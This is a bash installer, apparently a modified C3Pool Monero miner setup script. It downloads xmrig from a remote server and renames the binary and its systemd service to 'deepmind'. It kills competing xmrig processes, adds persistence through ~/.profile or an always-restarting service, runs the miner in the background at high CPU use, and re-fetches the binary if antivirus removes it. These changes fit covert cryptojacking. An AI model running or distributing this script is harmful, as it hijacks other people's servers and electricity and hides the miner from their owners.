#!/bin/bash

VERSION=2.11

# printing greetings

echo "C3Pool mining setup script v$VERSION."
echo "警告: 请勿将此脚本使用在非法用途,如有发现在非自己所有权的服务器内使用该脚本"
echo "我们将在接到举报后,封禁违法的钱包地址,并将有关信息收集并提交给警方"
echo "(please report issues to support@c3pool.com email with full output of this script with extra \"-x\" \"bash\" option)"
echo

if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not adviced to run this script under root"
  echo "警告: 不建议在root用户下使用此脚本"
fi

# command line arguments
WALLET=$1
EMAIL="" # this one is optional
PASS=$2

# checking prerequisites

if [ -z $WALLET ]; then
  echo "Script usage:"
  echo "> setup_c3pool_miner.sh <wallet address> [<your email address>]"
  echo "ERROR: Please specify your wallet address"
  exit 1
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
  exit 1
fi

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi

#if ! sudo -n true 2>/dev/null; then
#  if ! pidof systemd >/dev/null; then
#    echo "ERROR: This script requires systemd to work correctly"
#    exit 1
#  fi
#fi

# calculating port

CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

power2() {
  if ! type bc >/dev/null; then
    if   [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    else
      echo "1"
    fi
  else 
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
  fi
}

PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
PORT=$(( $PORT == 0 ? 1 : $PORT ))
PORT=`power2 $PORT`
PORT=$(( 19999 ))
if [ -z $PORT ]; then
  echo "ERROR: Can't compute port"
  exit 1
fi

if [ "$PORT" -lt "19999" -o "$PORT" -gt "19999" ]; then
  echo "ERROR: Wrong computed port value: $PORT"
  exit 1
fi


# printing intentions

echo "I will download, setup and run in background Monero CPU miner."
echo "将进行下载设置,并在后台中运行xmrig矿工."
echo "If needed, miner in foreground can be started by $HOME/c3pool/miner.sh script."
echo "如果需要,可以通过以下方法启动前台矿工输出 $HOME/c3pool/miner.sh script."
echo "Mining will happen to $WALLET wallet."
echo "将使用 $WALLET 地址进行开采"
if [ ! -z $EMAIL ]; then
  echo "(and $EMAIL email as password to modify wallet options later at https://c3pool.com site)"
fi
echo

if ! sudo -n true 2>/dev/null; then
  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
  echo "由于脚本无法执行无密码的sudo，因此在您重启后首次登录此主机时，后台开采将从您的 $HOME/.profile 文件开始."
else
  echo "Mining in background will be performed using c3pool_miner systemd service."
  echo "后台开采将使用c3pool_miner systemd服务执行."
fi

echo
echo "JFYI: This host has $CPU_THREADS CPU threads with $CPU_MHZ MHz and ${TOTAL_CACHE}KB data cache in total, so projected Monero hashrate is around $EXP_MONERO_HASHRATE H/s."
echo

echo "Sleeping for 1 seconds before continuing (press Ctrl+C to cancel)"
echo "等待 1 秒将继续运行安装 (按 Ctrl+C 取消)"
sleep 1
echo
echo

# start doing stuff: preparing miner

echo "[*] Removing previous c3pool miner (if any)"
echo "[*] 卸载以前的 C3Pool 矿工 (如果存在)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop deepmind.service
fi
killall -9 xmrig

echo "[*] Removing $HOME/c3pool directory"
rm -rf $HOME/c3pool

echo "[*] Downloading C3Pool advanced version of xmrig to /tmp/xmrig.tar.gz"
echo "[*] 下载 C3Pool 版本的 Xmrig 到 /tmp/xmrig.tar.gz 中"
if ! curl -L --progress-bar "http://download.c3pool.com/xmrig_setup/raw/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download http://download.c3pool.com/xmrig_setup/raw/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
  echo "发生错误: 无法下载 http://download.c3pool.com/xmrig_setup/raw/master/xmrig.tar.gz 文件到 /tmp/xmrig.tar.gz"
  exit 1
fi

echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/c3pool"
echo "[*] 解压 /tmp/xmrig.tar.gz 到 $HOME/c3pool"
[ -d $HOME/c3pool ] || mkdir $HOME/c3pool
if ! tar xf /tmp/xmrig.tar.gz -C $HOME/c3pool; then
  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/c3pool directory"
  echo "发生错误: 无法解压 /tmp/xmrig.tar.gz 到 $HOME/c3pool 目录"
  exit 1
fi
rm /tmp/xmrig.tar.gz
mv $HOME/c3pool/xmrig $HOME/c3pool/deepmind
echo "[*] Checking if advanced version of $HOME/c3pool/deepmind works fine (and not removed by antivirus software)"
echo "[*] 检查目录 $HOME/c3pool/deepmind 中的deepmind是否运行正常 (或者是否被杀毒软件误杀)"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/c3pool/config.json
$HOME/c3pool/deepmind --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/c3pool/deepmind ]; then
    echo "WARNING: Advanced version of $HOME/c3pool/deepmind is not functional"
	echo "警告: 版本 $HOME/c3pool/deepmind 无法正常工作"
  else 
    echo "WARNING: Advanced version of $HOME/c3pool/deepmind was removed by antivirus (or some other problem)"
	echo "警告: 该目录 $HOME/c3pool/deepmind 下的xmrig已被杀毒软件删除 (或其它问题)"
  fi

  echo "[*] Looking for the latest version of Monero miner"
  echo "[*] 查看最新版本的 xmrig 挖矿工具"
  LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
  LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`

  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
  echo "[*] 下载 $LATEST_XMRIG_LINUX_RELEASE 到 /tmp/xmrig.tar.gz"
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
	echo "发生错误: 无法下载 $LATEST_XMRIG_LINUX_RELEASE 文件到 /tmp/xmrig.tar.gz"
    exit 1
  fi

  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/c3pool"
  echo "[*] 解压 /tmp/xmrig.tar.gz 到 $HOME/c3pool"
  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/c3pool --strip=1; then
    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/c3pool directory"
	echo "警告: 无法解压 /tmp/xmrig.tar.gz 到 $HOME/c3pool 目录下"
  fi
  rm /tmp/xmrig.tar.gz
  mv $HOME/c3pool/xmrig $HOME/c3pool/deepmind

  echo "[*] Checking if stock version of $HOME/c3pool/deepmind works fine (and not removed by antivirus software)"
  echo "[*] 检查目录 $HOME/c3pool/deepmind 中的xmrig是否运行正常 (或者是否被杀毒软件误杀)"
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/c3pool/config.json
  $HOME/c3pool/deepmind --help >/dev/null
  if (test $? -ne 0); then 
    if [ -f $HOME/c3pool/deepmind ]; then
      echo "ERROR: Stock version of $HOME/c3pool/deepmind is not functional too"
	  echo "发生错误: 该目录中的 $HOME/c3pool/deepmind 也无法使用"
    else 
      echo "ERROR: Stock version of $HOME/c3pool/deepmind was removed by antivirus too"
	  echo "发生错误: 该目录中的 $HOME/c3pool/deepmind 已被杀毒软件删除"
    fi
    exit 1
  fi
fi

echo "[*] Miner $HOME/c3pool/deepmind is OK"
echo "[*] 矿工 $HOME/c3pool/deepmind 运行正常"

#PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
#PASS="365portalaz"
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
fi


sed -i 's/"url": *"[^"]*",/"url": "auto.c3pool.org:'$PORT'",/' $HOME/c3pool/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/c3pool/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/c3pool/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 95,/' $HOME/c3pool/config.json
#sed -i 's#"log-file": *null,#"log-file": "'$HOME/c3pool/xmrig.log'",#' $HOME/c3pool/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/c3pool/config.json

cp $HOME/c3pool/config.json $HOME/c3pool/config_background.json
sed -i 's/"background": *false,/"background": true,/' $HOME/c3pool/config_background.json

# preparing script

echo "[*] Creating $HOME/c3pool/miner.sh script"
echo "[*] 在该目录下创建 $HOME/c3pool/miner.sh 脚本"
cat >$HOME/c3pool/miner.sh <<EOL
#!/bin/bash
if ! pidof deepmind >/dev/null; then
  nice $HOME/c3pool/deepmind \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall deepmind\" or \"sudo killall deepmind\" if you want to remove background miner first."
  echo "门罗币矿工已经在后台运行。 拒绝运行另一个."
  echo "如果要先删除后台矿工，请运行 \"killall deepmind\" 或 \"sudo killall deepmind\"."
fi
EOL

chmod +x $HOME/c3pool/miner.sh

# preparing script background work and work under reboot

if ! sudo -n true 2>/dev/null; then
  if ! grep c3pool/miner.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding $HOME/c3pool/miner.sh script to $HOME/.profile"
	echo "[*] 添加 $HOME/c3pool/miner.sh 到 $HOME/.profile"
    echo "$HOME/c3pool/miner.sh --config=$HOME/c3pool/config_background.json >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like $HOME/c3pool/miner.sh script is already in the $HOME/.profile"
	echo "脚本 $HOME/c3pool/miner.sh 已存在于 $HOME/.profile 中."
  fi
  echo "[*] Running miner in the background (see logs in $HOME/c3pool/deepmind.log file)"
  echo "[*] 已在后台运行xmrig矿工 (请查看 $HOME/c3pool/xmrig.log 日志文件)"
  /bin/bash $HOME/c3pool/miner.sh --config=$HOME/c3pool/config_background.json >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
    echo "[*] Enabling huge pages"
	echo "[*] 启用 huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    echo "[*] Running miner in the background (see logs in $HOME/c3pool/deepmind.log file)"
	echo "[*] 已在后台运行xmrig矿工 (请查看 $HOME/c3pool/deepmind.log 日志文件)"
    /bin/bash $HOME/c3pool/miner.sh --config=$HOME/c3pool/config_background.json >/dev/null 2>&1
    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."

  else

    echo "[*] Creating c3pool_miner systemd service"
    cat >/tmp/deepmind.service <<EOL
[Unit]
Description=Monero miner service

[Service]
ExecStart=$HOME/c3pool/deepmind --config=$HOME/c3pool/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/deepmind.service /etc/systemd/system/deepmind.service
    echo "[*] Starting c3pool_miner systemd service"
	echo "[*] 启动c3pool_miner systemd服务"
    sudo killall deepmind 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable deepmind.service
    sudo systemctl start deepmind.service
    echo "To see miner service logs run \"sudo journalctl -u deepmind -f\" command"
	echo "查看矿工服务日志,请运行 \"sudo journalctl -u deepmind -f\" 命令"
  fi
fi

echo ""
echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
echo "提示: 如果您使用共享VPS，建议避免由矿工产生100％的CPU使用率，否则可能将被禁止使用"
if [ "$CPU_THREADS" -lt "4" ]; then
  echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
  echo "sudo cpulimit -e deepmind -l $((75*$CPU_THREADS)) -b"
  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
    echo "sudo sed -i -e '\$acpulimit -e deepmind -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  else
    echo "sudo sed -i -e '\$i \\cpulimit -e deepmind -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  fi
else
  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/c3pool/config.json"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/c3pool/config_background.json"
fi
echo ""

echo "[*] Setup complete"
echo "[*] 安装完成"
echo "警告: 请勿将此脚本使用在非法用途,如有发现在非自己所有权的服务器内使用该脚本"
echo "我们将在接到举报后,封禁违法的钱包地址,并将有关信息收集并提交给警方"
